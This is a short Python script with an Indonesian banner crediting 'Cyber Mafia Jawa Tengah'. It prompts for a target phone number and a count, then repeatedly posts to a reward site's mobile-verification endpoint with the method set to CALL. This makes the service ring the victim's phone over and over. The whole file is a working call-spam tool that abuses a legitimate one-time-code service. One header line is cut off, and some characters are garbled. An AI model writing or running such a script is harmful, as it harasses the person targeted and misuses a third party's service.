# script-Data-seluruh-Spamcall
#module
import os,sys ,time,requests
from time import sleep

#Tampilan
os.system("clear")
sleep(1)
os.system("SpamCall")
banner= """
===================================================
{*} Author : By Mr.Cyber•Jawa Tengah
{*} Team   : Cyber Mafia Jawa Tengah
=================================================="""
sleep(1)
print(banner)
nomor = input("nomor target: ")
jumlah = int(input("jumlah Spam: "))

url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Moz>
dat = {"method": "CALL","countryCode": "id",}

for i in range(jumlah):
    send = requests.post(url+nomor, headers=ua, data=dat)
    print(" [â€¢] Status ~+> ",(send.json()["message"]))
